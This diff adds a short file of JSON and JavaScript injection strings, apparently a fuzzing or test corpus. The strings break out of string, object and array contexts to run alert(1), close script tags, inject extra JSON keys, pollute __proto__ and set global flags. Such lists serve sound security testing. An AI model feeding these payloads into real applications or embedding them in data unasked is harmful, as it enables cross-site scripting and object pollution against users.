@@ -1,0 +1,13 @@
+"}];alert(1);//"
+"};alert(1);//"
+"));alert(1);//"
+";alert(1);//"
+</script><script>alert(1)</script>
+"},"injected":1,"x":"1
+"}]},{"injected":true,"x":"1
+","injected":true,"x":"1
+"__proto__":{"polluted":1}
+"};global._JSON_INJECTED=1;//
+"};this._json_injected=1;//
+"]};alert(1);//"
+"}]});/*json*/(function(){return 1;})()//
